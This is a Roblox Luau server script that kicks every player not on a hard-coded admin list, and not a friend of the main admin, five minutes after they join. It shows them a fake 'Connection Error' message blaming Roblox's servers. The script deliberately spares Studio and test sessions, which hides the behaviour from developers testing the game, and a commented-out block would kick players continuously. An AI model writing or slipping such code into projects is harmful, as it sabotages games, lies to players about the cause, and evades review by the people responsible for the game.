local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local AdminIDs = {
    2438141329,
    696024985,
    1188243571,
    2836708688,
    1354505399,
    4028638914,
    1141982730,
    2901534066,
    4043015633,
    658957597,
    1199270449
}

local MainAdminId = 2438141329

local function IsTestEnvironment()
    return RunService:IsStudio() or RunService:IsRunMode()
end

local function IsProtected(player)
    if IsTestEnvironment() then
        return true
    end

    for _, id in ipairs(AdminIDs) do
        if player.UserId == id then
            return true
        end
    end

    local success, isFriend = pcall(function()
        return player:IsFriendsWith(MainAdminId)
    end)
    if success and isFriend then
        return true
    end

    return false
end

local function action(player)
    if player and not IsProtected(player) then
        player:Kick("Connection Error, waiting for Roblox's servers. Please try again later.")
    end
end

Players.PlayerAdded:Connect(function(player)
    task.wait(300)
    action(player)
end)
--[[RunService.Stepped:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        action(player)
    end
end)]]
